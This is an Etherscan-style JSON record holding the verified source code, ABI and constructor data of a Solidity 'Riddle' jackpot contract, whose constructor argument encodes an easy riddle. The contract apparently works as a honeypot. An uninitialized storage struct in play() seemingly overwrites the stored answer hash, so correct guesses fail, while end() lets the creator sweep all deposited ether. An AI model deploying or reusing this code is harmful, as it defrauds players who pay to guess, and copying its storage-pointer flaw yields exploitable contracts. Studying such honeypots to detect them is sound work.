{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.24;\r\n//\r\n// Answer the riddle and win the jackpot\r\n// To play, call the play() method with your guess and 0.25 ether\r\n//\r\n// Hint: Check the previous guesses to avoid wrong answers\r\n//\r\ncontract Riddle {\r\n    bytes32 private answerHash;\r\n    bool private isActive;\r\n    Guess[] public guesses;\r\n    string public riddle;\r\n    string public answer;\r\n\r\n    struct Guess { address player; string guess; }\r\n    address private riddler;\r\n\r\n    function () payable public {}\r\n    \r\n    constructor (string _riddle, bytes32 _answerHash) public payable {\r\n        riddler = msg.sender;\r\n        riddle = _riddle;\r\n        answerHash = _answerHash;\r\n        isActive = true;\r\n    }\r\n\r\n    function play(string guess) public payable {\r\n        require(isActive);\r\n        require(msg.value >= 0.25 ether);\r\n        require(bytes(guess).length > 0);\r\n        \r\n        Guess newGuess;\r\n        newGuess.player = msg.sender;\r\n        newGuess.guess = guess;\r\n        guesses.push(newGuess);\r\n        \r\n        if (keccak256(guess) == answerHash) {\r\n            answer = guess;\r\n            isActive = false;\r\n            msg.sender.transfer(this.balance);\r\n        }\r\n    }\r\n    \r\n    function end(string _answer) public {\r\n        require(msg.sender == riddler);\r\n        answer = _answer;\r\n        isActive = false;\r\n        msg.sender.transfer(this.balance);\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"guesses\",\"outputs\":[{\"name\":\"player\",\"type\":\"address\"},{\"name\":\"guess\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"riddle\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"guess\",\"type\":\"string\"}],\"name\":\"play\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"answer\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_answer\",\"type\":\"string\"}],\"name\":\"end\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"_riddle\",\"type\":\"string\"},{\"name\":\"_answerHash\",\"type\":\"bytes32\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"Riddle","CompilerVersion":"v0.4.24+commit.e67f0147","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"0000000000000000000000000000000000000000000000000000000000000040d8070e0bc0f18841a0971cd1005f5dd33c0df65de2a15de3f28aa36cf875b0d900000000000000000000000000000000000000000000000000000000000000455768617420666976652d6c657474657220776f7264206265636f6d65732073686f72746572207768656e20796f75206164642074776f206c65747465727320746f2069743f000000000000000000000000000000000000000000000000000000","Library":"","SwarmSource":"bzzr://175369f77a66d10ba7c75ddcf5d52f8695dc2484eb4076c144bab4d177477882"}]}